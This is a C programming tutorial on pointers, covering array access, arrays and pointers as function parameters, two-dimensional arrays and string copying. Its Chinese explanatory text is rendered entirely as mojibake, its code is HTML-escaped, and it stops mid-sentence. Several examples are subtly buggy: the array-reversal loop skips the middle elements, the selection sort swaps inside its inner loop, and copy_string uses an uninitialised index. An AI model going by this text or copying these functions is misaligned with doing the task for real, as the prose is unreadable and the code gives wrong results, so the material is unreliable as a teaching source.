ä¸ºäº†ä½¿åœ¨å‡½æ•°ä¸­æ”¹å˜äº†çš„å˜é‡å€¼èƒ½è¢«ä¸»è°ƒå‡½æ•°mainæ‰€ç”¨,ä¸èƒ½é‡‡å–æŠŠæ”¹å˜å€¼çš„å˜é‡ä½œä¸ºå‚æ•°çš„åŠæ³•, è€Œåº”è¯¥ç”¨æŒ‡é’ˆå˜é‡ä½œä¸ºå‡½æ•°çš„å‚æ•°,ä½¿æŒ‡é’ˆå˜é‡æ‰€æŒ‡å‘çš„å˜é‡å€¼å‘ç”Ÿå˜åŒ–,åœ¨å‡½æ•°è°ƒç”¨ç»“æŸå,è¿™äº›å˜é‡å€¼çš„å˜åŒ–ä¾ç„¶ä¿ç•™äº†ä¸‹æ¥. â€”â€”â€”â€”â€”â€”æœ‰å…³å€¼ä¼ é€’è¯·çœ‹ï¼šå€¼ä¼ é€’â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” :x:ä¸å¯ä»¥é€šè¿‡æ‰§è¡Œè°ƒç”¨å‡½æ•°æ¥æ”¹å˜å®å‚æŒ‡é’ˆå˜é‡çš„å€¼,ä½†æ˜¯å¯ä»¥æ”¹å˜å®å‚æŒ‡é’ˆå˜é‡æ‰€æŒ‡å˜é‡çš„å€¼:void swap(int *point_a, int *point_b) { int *temp; temp = point_a; point_a = point_b; point_b = temp; } ------ Ã—æ— æ³•æ”¹å˜ é€šè¿‡æŒ‡é’ˆå¼•ç”¨æ•°ç»„ æ•°ç»„å…ƒç´ çš„æŒ‡é’ˆå°±æ˜¯æ•°ç»„å…ƒç´ çš„åœ°å€ å¯ä»¥ç”¨ä¸€ä¸ªæŒ‡é’ˆå˜é‡æŒ‡å‘ä¸€ä¸ªæ•°ç»„å…ƒç´ .å¦‚: int a[10]={1,3,5,7,9,11,13,15,17,19}; int *p; p=&amp;a[0]; //ä¹Ÿå¯ä»¥å†™æˆp=a; æŒ‡é’ˆå˜é‡pçš„å€¼æ˜¯æ•°ç»„aé¦–å…ƒç´ å³a[0]çš„åœ°å€.è€Œä¸æ˜¯æ•°ç»„aå„å…ƒç´ çš„å€¼. åœ¨å¼•ç”¨æ•°ç»„å…ƒç´ æ—¶æŒ‡é’ˆçš„è¿ç®—. æŒ‡é’ˆå˜é‡pæŒ‡å‘æ•°ç»„å…ƒç´ a[0],å¸Œæœ›ç”¨p+1è¡¨ç¤ºæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ a[1]; ç³»ç»Ÿä¼šæ ¹æ®æŒ‡é’ˆå˜é‡çš„åŸºç±»å‹æ¥ç¡®å®šå¢åŠ çš„å­—èŠ‚æ•°. å¦‚: æ•´å‹ç±»å‹çš„æŒ‡é’ˆå˜é‡int *p, p+1å°±æ˜¯ä½ç§»ä¸€ä¸ªæ•°ç»„å…ƒç´ (int)æ‰€å ç”¨çš„å­—èŠ‚æ•°ä¹Ÿå°±æ˜¯4. å¦‚æœpçš„åˆå€¼ä¸º&amp;a[0],åˆ™p+iå’Œa+iå°±æ˜¯æ•°ç»„å…ƒç´ a[i]çš„åœ°å€. *(p+i)æˆ–*(a+i)æ˜¯p+iæˆ–a+iå°±æ˜¯æ•°ç»„å…ƒç´ ,å³a[i]. å®é™…ä¸Šç¼–è¯‘ç³»ç»Ÿåœ¨ç¼–è¯‘æ—¶,å¯¹æ•°ç»„å…ƒç´ a[i]å°±æ˜¯æŒ‰*(a+i)å¤„ç†çš„.å³æŒ‰æ•°ç»„é¦–å­—æ¯çš„åœ°å€åŠ ä¸Šç›¸å¯¹ä½ç§»é‡å¾—åˆ°è¦æ‰¾çš„å…ƒç´ çš„åœ°å€,ç„¶åæ‰¾å‡ºè¯¥å•å…ƒä¸­çš„å†…å®¹. [ ]å®é™…ä¸Šæ˜¯å˜å€è¿ç®—ç¬¦,å³å°†a[i]æŒ‰a+iè®¡ç®—åœ°å€,ç„¶åæ‰¾å‡ºæ­¤åœ°å€å•å…ƒä¸­çš„å€¼. å¦‚æœæŒ‡é’ˆå˜é‡p1å’Œp2éƒ½æ˜¯æŒ‡å‘åŒä¸€æ•°ç»„å…ƒç´ çš„é•¿åº¦,å¦‚æ‰§è¡Œp2-p1,ç»“æœæ˜¯p2-p1çš„å€¼(ä¸¤ä¸ªåœ°å€ä¹‹å·®)é™¤ä»¥æ•°ç»„å…ƒç´ çš„é•¿åº¦. é€šè¿‡ç”¨p2-p1å°±å¯çŸ¥é“å®ƒä»¬æ‰€æŒ‡å‘å…ƒç´ çš„ç›¸å¯¹è·ç¦». ä¸¤ä¸ªåœ°å€ä¸èƒ½ç›¸åŠ ,å¦‚p1+p2æ˜¯æ— å®é™…æ„ä¹‰çš„. é€šè¿‡æŒ‡é’ˆå¼•ç”¨æ•°ç»„å…ƒç´ å¼•ç”¨æ•°ç»„å…ƒç´ æœ‰ä¸¤ç§æ–¹æ³• ä¸‹æ ‡æ³•( a[i] ) æŒ‡é’ˆæ³•( *(a+i)æˆ–*(p+i),å…¶ä¸­aæ˜¯æ•°ç»„å,pæ˜¯æŒ‡å‘æ•°ç»„å…ƒç´ çš„æŒ‡é’ˆå˜é‡.å…¶åˆå€¼ä¸ºp=a; ) æœ‰ä¸€ä¸ªæ•´å‹æ•°ç»„a,æœ‰10ä¸ªå…ƒç´ ,è¦æ±‚è¾“å‡ºæ•°ç»„ä¸­çš„å…¨éƒ¨å…ƒç´ .1)ä¸‹æ ‡æ³•: #include&lt;stdio.h&gt; int main() { int i, a[10]; printf(&quot;please enter 10 integer numbers:&quot;); for (i = 0; i &lt; 10; i++) scanf(&quot;%d&quot;, &amp;a[i]); for (i = 0; i &lt; 10; i++) printf(&quot;%d&quot;, a[i]); printf(&quot;\\n&quot;); return 0; } 2)é€šè¿‡æ•°ç»„åè®¡ç®—æ•°ç»„å…ƒç´ åœ°å€,æ‰¾å‡ºå…ƒç´ çš„å€¼ #include&lt;stdio.h&gt; int main() { int i, a[10]; printf(&quot;please enter 10 integer numbers:&quot;); for (i = 0; i &lt; 10; i++) scanf(&quot;%d&quot;, &amp;a[i]); for (i = 0; i &lt; 10; i++) printf(&quot;%d\\t&quot;, *(a + i)); printf(&quot;\\n&quot;); return 0; } 3)ç”¨æŒ‡é’ˆå˜é‡æŒ‡å‘æ•°ç»„å…ƒç´  #include&lt;stdio.h&gt; int main() { int a[10], *p; printf(&quot;please enter 10 integer numbers:&quot;); for (p = a; p &lt; (a + 10); p++) scanf(&quot;%d&quot;, p); for (p = a; p &lt; (a + 10); p++) printf(&quot;%d\\t&quot;, *p); printf(&quot;\\n&quot;); return 0; } ç»“è®º ç¬¬1å’Œ2ç§æ–¹æ³•æ‰§è¡Œæ•ˆç‡æ˜¯ç›¸åŒçš„. åœ¨ç¼–è¯‘æ—¶,å¯¹æ•°ç»„å…ƒç´ a[i]å°±æ˜¯æŒ‰*(a+i)å¤„ç†çš„ ç¬¬3ç§æ–¹æ³•æ¯”ç¬¬1å’Œ2ç§æ–¹æ³•,ç”¨æŒ‡é’ˆå˜é‡ç›´æ¥æŒ‡å‘å…ƒç´ ,ä¸å¿…æ¯æ¬¡éƒ½é‡æ–°è®¡ç®—åœ°å€,åƒp++è¿™æ ·çš„è‡ªåŠ æ“ä½œæ˜¯æ¯”è¾ƒå¿«çš„.è¿™ç§æœ‰è§„å¾‹åœ°æ”¹å˜åœ°å€å€¼(p++)èƒ½å¤§å¤§æé«˜æ•ˆç‡. å¤šæ¬¡ä½¿ç”¨æŒ‡é’ˆå˜é‡æ—¶,åº”æ³¨æ„æŒ‡é’ˆå˜é‡çš„ä½ç½®,æ¯æ¬¡æ‰§è¡Œåå¯ä½¿æŒ‡é’ˆå˜é‡é‡æ–°æŒ‡å‘æ•°ç»„a. ç”¨æ•°ç»„åä½œå‡½æ•°å‚æ•° å¯ä»¥ç”¨æ•°ç»„åä½œå‡½æ•°çš„å‚æ•°. å¦‚: #include&lt;stdio.h&gt; int main() { void fun(int arr[], int n); int array[10]; fun(array, 10); return 0; } void fun(int arr[], int n) { } Cç¼–è¯‘æ—¶æ˜¯å°†å½¢å‚æ•°ç»„åä½œä¸ºæŒ‡é’ˆå˜é‡æ¥å¤„ç†çš„. void fun(int arr[], int n) ç­‰åŒäº void fun(int *arr, int n) :eight_pointed_black_star:ç”±äºå½¢å‚æ•°ç»„åarræ¥æ”¶äº†å®å‚æ•°ç»„é¦–å…ƒç´ a[0]çš„åœ°å€.æ‰€ä»¥ç”¨æ•°ç»„åå‚æ•°æ—¶,å½¢å‚æ•°ç»„ä¸­å„å…ƒç´ çš„å€¼å‘ç”Ÿå˜åŒ–,å®å‚æ•°ç»„å…ƒç´ çš„å€¼ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–. å°†æ•°ç»„aä¸­nä¸ªæ•´æ•°æŒ‰ç›¸åé¡ºåºå­˜æ”¾.#include&lt;stdio.h&gt; int main() { void inv(int [], int); int i, a[10]; printf(&quot;please enter original array:\\n&quot;); for (i = 0; i &lt; 10; ++i) scanf(&quot;%d&quot;, &amp;a[i]); inv(a, 10); printf(&quot;The array has been inverted:\\n&quot;); for (i = 0; i &lt; 10; ++i) printf(&quot;%d\\t&quot;, a[i]); return 0; } void inv(int arr[], int n) { int i, j,temp,m=(n-1)/2; for (i = 0; i &lt; m; ++i) { j = n - 1 - i; temp = arr[j]; arr[j] = arr[i]; arr[i] = temp; } } æŒ‡é’ˆå˜é‡ä½œå½¢å‚ï¼š #include&lt;stdio.h&gt; int main() { void inv(int [], int); int i, a[10]; printf(&quot;please enter original array:\\n&quot;); for (i = 0; i &lt; 10; ++i) scanf(&quot;%d&quot;, &amp;a[i]); inv(a, 10); printf(&quot;The array has been inverted:\\n&quot;); for (i = 0; i &lt; 10; ++i) printf(&quot;%d\\t&quot;, a[i]); return 0; } void inv(int *arr, int n) { int *p, *i, *j, temp, m = (n - 1) / 2; i = arr; //å¤´éƒ¨çš„æŒ‡é’ˆä½ç½® j = arr + n - 1;//æœ«å°¾çš„æŒ‡é’ˆä½ç½® p = arr + m; //ä¸­å€¼çš„æŒ‡é’ˆä½ç½® for (; i &lt;= p; ++i, j--) { temp = *j; *j = *i; *i = temp; } return; } å½’çº³åˆ†æå¦‚æœæœ‰ä¸€ä¸ªå®å‚æ•°ç»„,è¦æƒ³åœ¨å‡½æ•°ä¸­æ”¹å˜æ­¤æ•°ç»„ä¸­çš„å…ƒç´ çš„å€¼,å®å‚ä¸å½¢å‚çš„å¯¹åº”å…³ç³»æœ‰: å½¢å‚å’Œå®å‚éƒ½ç”¨æ•°ç»„å. ```cint main(){ int a[10]; ... f(a, 10); } int f(int x[], int n){ ... } - å®å‚ç”¨æ•°ç»„å,å½¢å‚ç”¨æŒ‡é’ˆå˜é‡ ```c int main() { int a[10]; ... f(a, 10); } int f(int *x, int n) { ... } å®å‚å½¢å‚éƒ½æ˜¯ç”¨æŒ‡é’ˆå˜é‡ int main() { int a[10],*p=a; ... f(p, 10); } int f(int *x, int n) { ... } å®å‚ç”¨æŒ‡é’ˆå˜é‡,å½¢å‚ç”¨æ•°ç»„å. int main() { int a[10],*p=a; ... f(p, 10); } int f(int x[], int n) { ... } ç”¨æŒ‡é’ˆæ–¹æ³•å¯¹10ä¸ªæ•´æ•°æŒ‰ç”±å¤§åˆ°å°é¡ºåºæ’åº#include&lt;stdio.h&gt; int main() { void sort(int [], int); int i, a[10]; printf(&quot;please enter original array:\\n&quot;); for (i = 0; i &lt; 10; ++i) scanf(&quot;%d&quot;, &amp;a[i]); sort(a, 10); printf(&quot;The array has been sorted:\\n&quot;); for (i = 0; i &lt; 10; ++i) printf(&quot;%d\\t&quot;, a[i]); return 0; } void sort(int arr[], int len) { int i, j, temp, max; for (i = 0; i &lt; len - 1; ++i) { max = i; for (j = i + 1; j &lt; len; ++j) { if (arr[j] &gt; arr[max]) max = j; if (max != i) { temp = arr[i]; arr[i] = arr[max]; arr[max] = temp; } } } } é€šè¿‡æŒ‡é’ˆæŒ‡å‘å¤šç»´æ•°ç»„å¤šç»´æ•°ç»„çš„åœ°å€a[0]è¡¨ç¤ºä¸€ç»´æ•°ç»„a[0]ç¬¬0åˆ—å…ƒç´ çš„åœ°å€ï¼Œå³&amp;a[0][0]. a[0]+1è¡¨ç¤ºaæ•°ç»„0è¡Œ1åˆ—. a[0]ä¸(a+0)ç­‰ä»·ï¼Œa[1]å’Œ\\(a+1)ç­‰ä»·ï¼Œ a[i]å’Œ*(a+i)ç­‰ä»· å¦‚æœaæ˜¯ä¸€ç»´æ•°ç»„åï¼Œåˆ™a[i]è¡¨ç¤ºaæ•°ç»„åºå·ä¸ºiçš„å…ƒç´ çš„å­˜å‚¨å•å…ƒã€‚ ä½†å¦‚æœaæ˜¯äºŒç»´æ•°ç»„ï¼Œåˆ™a[i]æ˜¯ä¸€ç»´æ•°ç»„åï¼Œå®ƒåªæ˜¯ä¸€ä¸ªåœ°å€ï¼Œå¹¶ä¸ä»£è¡¨ä¸€ä¸ªå­˜å‚¨å•å…ƒï¼Œä¹Ÿä¸ä»£è¡¨å­˜å‚¨å•å…ƒçš„å€¼(å¦‚åŒä¸€ç»´æ•°ç»„ååªæ˜¯ä¸€ä¸ªæŒ‡é’ˆå˜é‡ä¸€æ ·) äºŒç»´æ•°ç»„(å¦‚a)æ˜¯æŒ‡å‘è¡Œ(ä¸€ç»´æ•°ç»„)çš„ã€‚å› æ­¤a+1çš„â€œ1â€ä»£è¡¨ä¸€è¡Œä¸­å…¨éƒ¨å…ƒç´ æ‰€å çš„å­—èŠ‚æ•°ã€‚a[0]+1ä¸­çš„1ä»£è¡¨ä¸€ä¸ªaå…ƒç´ æ‰€å çš„å­—èŠ‚æ•°ã€‚ åœ¨æŒ‡å‘è¡Œçš„æŒ‡é’ˆå‰é¢åŠ ä¸€ä¸ª*ï¼Œå°±è½¬æ¢ä¸ºåˆ—çš„æŒ‡é’ˆã€‚ åä¹‹ï¼Œåœ¨åˆ—æŒ‡é’ˆå‰é¢åŠ ä¸€ä¸ª&amp;ï¼Œå°±è½¬æ¢ä¸ºè¡Œçš„æŒ‡é’ˆ ä¸€ç»´æ•°ç»„å(å¦‚a[0],a[1])æ˜¯æŒ‡å‘åˆ—å…ƒç´ çš„ã€‚ #include&lt;stdio.h&gt; int main() { int a[3][4] = {1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23}; printf(&quot;%d,%d\\n&quot;, a, *a); //0è¡Œçš„åˆå§‹åœ°å€,0è¡Œ0åˆ—çš„å…ƒç´ åœ°å€ printf(&quot;%d,%d\\n&quot;, a[0], *(a + 0)); //0è¡Œ0åˆ—çš„å…ƒç´ åœ°å€ printf(&quot;%d,%d\\n&quot;, &amp;a[0], &amp;a[0][0]); //0è¡Œèµ·å§‹åœ°å€,0è¡Œ0åˆ—çš„å…ƒç´ åœ°å€ printf(&quot;%d,%d\\n&quot;, a[1], a + 1); //1è¡Œ0åˆ—çš„å…ƒç´ åœ°å€,1è¡Œèµ·å§‹åœ°å€ printf(&quot;%d,%d\\n&quot;, &amp;a[1][0], *(a + 1) + 0);//1è¡Œ0åˆ—çš„å…ƒç´ åœ°å€ printf(&quot;%d,%d\\n&quot;, a[2], *(a + 2)); //2è¡Œ0åˆ—çš„å…ƒç´ åœ°å€ printf(&quot;%d,%d\\n&quot;, &amp;a[2], a + 2); //2è¡Œçš„èµ·å§‹åœ°å€ printf(&quot;%d,%d\\n&quot;, a[1][0], *(*(a + 1) + 0));//1è¡Œ0åˆ—çš„å…ƒç´ çš„å€¼ printf(&quot;%d,%d\\n&quot;, *a[2], *(*(a + 2) + 0));//2è¡Œ0åˆ—çš„å…ƒç´ çš„å€¼ return 0; } æŒ‡å‘å¤šç»´æ•°ç»„çš„æŒ‡é’ˆå˜é‡æŒ‡å‘æ•°ç»„å…ƒç´ çš„æŒ‡é’ˆå˜é‡æœ‰ä¸€ä¸ª3Ã—4çš„äºŒç»´æ•°ç»„ï¼Œè¦æ±‚ç”¨æŒ‡å‘å…ƒç´ çš„æŒ‡é’ˆå˜é‡è¾“å‡ºäºŒç»´æ•°ç»„å„å…ƒç´ çš„å€¼#include&lt;stdio.h&gt; int main() { int a[3][4] = {1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23}; int *p; for (p = a[0]; p &lt; a[0] + 12; ++p) { if ((p - a[0]) % 4 == 0) //pç§»åŠ¨å››æ¬¡åæ¢è¡Œ printf(&quot;\\n&quot;); printf(&quot;%d\\t&quot;, *p); } printf(&quot;\\n&quot;); return 0; } è®¡ç®—a[i][j]åœ¨æ•°ç»„ä¸­çš„ç›¸å¯¹ä½ç½®ï¼š i*m+j(mä¸ºäºŒç»´æ•°ç»„çš„åˆ—æ•°ï¼ŒäºŒç»´æ•°ç»„å¤§å°ä¸ºnÃ—m) å¦‚ï¼š åœ¨ä¸€ä¸ª3Ã—4çš„äºŒç»´æ•°ç»„ä¸­ï¼Œa[2][3]å¯¹a[0][0]çš„ç›¸å¯¹ä½ç§»é‡ä¸º2*4+3=11å…ƒç´ ï¼› å¦‚æœä¸€ä¸ªå…ƒç´ å 4ä¸ªå­—èŠ‚ï¼Œåˆ™a[2][3]å¯¹a[0][0]çš„åœ°å€å·®ä¸º11*4=44å­—èŠ‚ã€‚ è‹¥å¼€å§‹æ—¶æŒ‡é’ˆå˜é‡pæŒ‡å‘a[0][0],a[i][j]çš„åœ°å€ä¸ºâ€&amp;a[0]\\[0]+(i*m+j)æˆ–p+(i*m+j)â€œ. æŒ‡å‘ç”±mä¸ªå…ƒç´ ç»„æˆçš„ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆå˜é‡è¾“å‡ºäºŒç»´æ•°ç»„ä»»ä¸€è¡Œä»»ä¸€åˆ—å…ƒç´ çš„å€¼#include&lt;stdio.h&gt; int main() { int a[3][4] = {1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23}; int (*p)[4], i, j; p = a; printf(&quot;please enter row and colum:&quot;); scanf(&quot;%d,%d&quot;, &amp;i, &amp;j); printf(&quot;a[%d,%d]=%d\\n&quot;, i, j, *(*(p + i) + j)); printf(&quot;\\n&quot;); return 0; } int (*p)[4]è¡¨ç¤ºå®šä¹‰pä¸ºä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œå®ƒæŒ‡å‘åŒ…å«4ä¸ªæ•´å‹å…ƒç´ çš„ä¸€ç»´æ•°ç»„. pçš„å€¼æ˜¯è¯¥ä¸€ç»´æ•°ç»„çš„èµ·å§‹åœ°å€.è™½ç„¶è¿™ä¸ªåœ°å€(æŒ‡çº¯åœ°å€)ä¸è¯¥ä¸€ç»´æ•°ç»„é¦–å…ƒç´ çš„åœ°å€ç›¸åŒ,ä½†å®ƒä»¬çš„åŸºç±»å‹ä¸åŒ. åˆ†æä¸‹åˆ—ç¨‹åº#include&lt;stdio.h&gt; int main() { int a[4] = {1, 3, 5, 7}; int (*p)[4]; p = &amp;a; printf(&quot;%d\\n&quot;, (*p)[3]); return 0; } æ³¨æ„,p = &amp;a;ä¸åº”å†™æˆp = a; å› ä¸ºè¿™æ ·å†™è¡¨ç¤ºpçš„å€¼æ˜¯&amp;a[0],æŒ‡å‘é¦–å…ƒç´ a[0]. p = &amp;a;è¡¨ç¤ºpæŒ‡å‘ä¸€ç»´æ•°ç»„(è¡Œ)ï¼Œ(*p)[3]æ˜¯pæŒ‡å‘çš„è¡Œä¸­åºå·ä¸º3çš„å…ƒç´ . è¦æ³¨æ„æŒ‡é’ˆå˜é‡çš„ç±»å‹,ä»int (*p)[4];å¯ä»¥çœ‹åˆ°,pçš„ç±»å‹ä¸æ˜¯int *å‹,è€Œæ˜¯int(*)[4]. pè¢«å®šä¹‰ä¸ºæŒ‡å‘ä¸€ç»´æ•´å‹æ•°ç»„çš„æŒ‡é’ˆå˜é‡,ä¸€ç»´æ•°ç»„æœ‰4ä¸ªå…ƒç´ ,å› æ­¤pçš„åŸºç±»å‹æ˜¯ä¸€ç»´æ•°ç»„,å…¶é•¿åº¦æ˜¯16å­—èŠ‚. ç”¨æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆä½œå‡½æ•°å‚æ•°å¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•: ç”¨æŒ‡å‘å˜é‡çš„æŒ‡é’ˆå˜é‡ ç”¨æŒ‡å‘ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆå˜é‡ æœ‰ä¸€ä¸ªç­,3ä¸ªå­¦ç”Ÿ,å„å­¦4é—¨è¯¾,è®¡ç®—æ€»å¹³å‡åˆ†æ•°ä»¥åŠç¬¬nä¸ªå­¦ç”Ÿçš„æˆç»©.#include&lt;stdio.h&gt; int main() { void average(float *, int); void search(float (*p)[4], int); float score[3][4] = {1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23}; average(*score, 12);//*è½¬æ¢ä¸ºåˆ—æŒ‡é’ˆå˜é‡ search(score, 2); return 0; } void average(float *p, int n) { float *p_end; float sum = 0, aver; p_end = p + n - 1;//æŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´  for (; p &lt;= p_end; p++) sum += (*p); aver = sum / n; printf(&quot;%5.2f\\n&quot;, aver); } void search(float (*p)[4], int n) { int i; printf(&quot;the score of No.%d are:\\n&quot;, n); for (i = 0; i &lt; 4; ++i) printf(&quot;%5.2f\\n&quot;, *(*(p + n) + i)); } :eight_pointed_black_star:å®å‚å’Œå½¢å‚å¦‚æœæ˜¯æŒ‡é’ˆç±»å‹ï¼Œåº”å½“æ³¨æ„å®ƒä»¬çš„åŸºç±»å‹å¿…é¡»ä¸€è‡´.ä¸åº”æŠŠintå‹çš„æŒ‡é’ˆ(å³æ•°ç»„å…ƒç´ çš„åœ°å€)ä¼ ç»™int(\\)[4]å‹(æŒ‡å‘ä¸€ç»´æ•°ç»„)çš„æŒ‡é’ˆå˜é‡,åä¹‹äº¦ç„¶. æŸ¥æ‰¾æœ‰ä¸€é—¨ä»¥ä¸Šè¯¾ç¨‹ä¸åŠæ ¼çš„å­¦ç”Ÿ,è¾“å‡ºä»–ä»¬å…¨éƒ¨è¯¾ç¨‹çš„æˆç»©#include&lt;stdio.h&gt; int main() { // æŸ¥æ‰¾æœ‰ä¸€é—¨ä»¥ä¸Šè¯¾ç¨‹ä¸åŠæ ¼çš„å­¦ç”Ÿ,è¾“å‡ºä»–ä»¬å…¨éƒ¨è¯¾ç¨‹çš„æˆç»© void search(float (*p)[4], int); float score[3][4] = {1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23}; search(score, 3); return 0; } void search(float (*p)[4], int n) { int i, j, flag; for (j = 0; j &lt; n; ++j) { flag = 0; for (i = 0; i &lt; 4; ++i) if (*(*(p + j) + i) &lt; 60) flag = 1; if (flag == 1) { printf(&quot;No.%d fails,his scores are:\\n&quot;, j + 1); for (i = 0; i &lt; 4; ++i) printf(&quot;%5.2f\\t&quot;, *(*(p + j) + i));// score[j][i] printf(&quot;\\n&quot;); } } } é€šè¿‡æŒ‡é’ˆå¼•ç”¨å­—ç¬¦ä¸²å­—ç¬¦ä¸²çš„å¼•ç”¨æ–¹æ³• ç”¨å­—ç¬¦æ•°ç»„å­˜æ”¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡æ•°ç»„åå’Œä¸‹æ ‡å¼•ç”¨å­—ç¬¦ä¸²ä¸­ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ•°ç»„åå’Œæ ¼å¼å£°æ˜â€œ%sâ€è¾“å‡ºè¯¥å­—ç¬¦ä¸². #include&lt;stdio.h&gt; int main() { char string[] = &quot;I Love China&quot;; printf(&quot;%s\\n&quot;, string); printf(&quot;%c\\n&quot;, string[7]); // string[7]=*(string+7) return 0; } ç”¨å­—ç¬¦æŒ‡é’ˆå˜é‡è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡,é€šè¿‡å­—ç¬¦æŒ‡é’ˆå˜é‡å¼•ç”¨å­—ç¬¦ä¸²å¸¸é‡. #include&lt;stdio.h&gt; int main() { char *string = &quot;I Love China!&quot;; printf(&quot;%s\\n&quot;, string); return 0; } å¯¹å­—ç¬¦æŒ‡é’ˆå˜é‡stringåˆå§‹åŒ–,å®é™…ä¸Šæ˜¯æŠŠå­—ç¬¦ä¸²ç¬¬1ä¸ªå…ƒç´ çš„åœ°å€(å³å­˜æ”¾å­—ç¬¦ä¸²çš„å­—ç¬¦æ•°ç»„çš„é¦–å…ƒç´ åœ°å€)èµ‹ç»™æŒ‡é’ˆå˜é‡string,ä½¿stringæŒ‡å‘å­—ç¬¦ä¸²çš„ç¬¬1ä¸ªå­—ç¬¦,ç”±äºå­—ç¬¦ä¸²å¸¸é‡â€I Love China!â€å·²ç”±ç³»ç»Ÿåˆ†é…åœ¨å†…å­˜ä¸­è¿ç»­çš„14ä¸ªå­—èŠ‚ä¸­,å› æ­¤,stringå°±æŒ‡å‘äº†è¯¥å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦. å¯ä»¥å¯¹æŒ‡é’ˆå˜é‡å†èµ‹å€¼; char *string = &quot;I Love China!&quot;; string = &quot;I&#39;m a student.&quot; å¯ä»¥é€šè¿‡å­—ç¬¦æŒ‡é’ˆå˜é‡è¾“å‡ºå®ƒæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸² printf(&quot;%s\\n&quot;, string); ç”¨%sèƒ½å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ•´ä½“çš„è¾“å…¥è¾“å‡º. å­—ç¬¦æ•°ç»„,åŒºåˆ«äºæ•°å€¼å‹æ•°ç»„(int[ ] a) %sæ˜¯è¾“å‡ºå­—ç¬¦ä¸²æ—¶æ‰€ç”¨çš„æ ¼å¼ç¬¦.åœ¨è¾“å‡ºé¡¹ä¸­ç»™å‡ºå­—ç¬¦æŒ‡é’ˆå˜é‡åstring,åˆ™ç³»ç»Ÿä¼šè¾“å‡ºstringæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ç¬¬1ä¸ªå­—ç¬¦,ç„¶åè‡ªåŠ¨ä½¿stringåŠ 1,ä½¿ä¹‹æŒ‡å‘ä¸‹ä¸€ä¸ªå­—ç¬¦,åœ¨è¾“å‡ºå­—ç¬¦â€¦ç›´åˆ°é‡åˆ°å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—&#39;\\0&#39;ä¸ºæ­¢. æ³¨æ„:åœ¨å†…å­˜ä¸­,å­—ç¬¦ä¸²çš„æœ€åè¢«è‡ªåŠ¨åŠ äº†ä¸€ä¸ª&#39;\\0&#39;.å› æ­¤åœ¨è¾“å‡ºæ—¶èƒ½ç¡®å®šè¾“å‡ºçš„å­—ç¬¦åˆ°ä½•æ—¶ç»“æŸ. å°†å­—ç¬¦ä¸²aå¤åˆ¶ä¸ºå­—ç¬¦ä¸²b,ç„¶åè¾“å‡ºå­—ç¬¦ä¸²b#include&lt;stdio.h&gt; int main() { char a[] = &quot;I am a student&quot;, b[20]; int i; for (i = 0; *(a + i) != &#39;\\0&#39;; ++i) *(b + i) = *(a + i); *(b + i) = &#39;\\0&#39;; printf(&quot;string a is:%s\\n&quot;, a); printf(&quot;string b is:\\n&quot;); for (i = 0; *(b + i) != &#39;\\0&#39;; ++i) printf(&quot;%c&quot;, b[i]); printf(&quot;\\n&quot;); return 0; } ç”¨æŒ‡é’ˆå˜é‡: #include&lt;stdio.h&gt; int main() { char a[] = &quot;I am a boy&quot;, b[20], *p1, *p2; p1 = a; p2 = b; for (; *p1 != &#39;\\0&#39;; ++p1, ++p2) *p2 = *p1; *p2 = &#39;\\0&#39;; printf(&quot;string a is:%s\\n&quot;,a); printf(&quot;string b is:%s\\n&quot;,b); printf(&quot;\\n&quot;); return 0; } å­—ç¬¦æŒ‡é’ˆä½œå‡½æ•°å‚æ•° å¦‚æœæƒ³æŠŠä¸€ä¸ªå­—ç¬¦ä¸²ä»ä¸€ä¸ªå‡½æ•°â€œä¼ é€’â€åˆ°å¦ä¸€å‡½æ•°ï¼Œå¯ä»¥ç”¨åœ°å€ä¼ é€’çš„åŠæ³•ï¼Œå³ç”¨å­—ç¬¦æ•°ç»„åä½œå‚æ•°ï¼Œä¹Ÿå¯ä»¥ç”¨å­—ç¬¦æŒ‡é’ˆå˜é‡ä½œå‚æ•°ã€‚åœ¨è¢«è°ƒç”¨çš„å‡½æ•°ä¸­å¯ä»¥æ”¹å˜å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œåœ¨ä¸»è°ƒå‡½æ•°ä¸­å¯ä»¥å¼•ç”¨æ”¹å˜åçš„å­—ç¬¦ä¸²ã€‚ ç”¨å‡½æ•°è°ƒç”¨å®ç°å­—ç¬¦ä¸²çš„å¤åˆ¶1)ç”¨å­—ç¬¦æ•°ç»„åä½œå‡½æ•°å‚æ•° #include&lt;stdio.h&gt; int main() { void copy_string(char from[], char to[]); char a[] = &quot;I am a teacher.&quot;; char b[] = &quot;You are a student.&quot;; printf(&quot;string a:%s\\nstring b:%s\\n&quot;, a, b); printf(&quot;copy string a to string b:\\n&quot;); copy_string(a, b); printf(&quot;string a:%s\\nstring b:%s\\n&quot;, a, b); return 0; } void copy_string(char from[], char to[]) { int i; while (from[i] != &#39;\\0&#39;) { to[i] = from[i]; i++; } to[i] = &#39;\\0&#39;; } å¤åˆ¶åçš„æ•°ç»„ä»å­˜åœ¨æ²¡æœ‰è¢«è¦†ç›–çš„å€¼(t, .,\\0); ç”¨%sæ 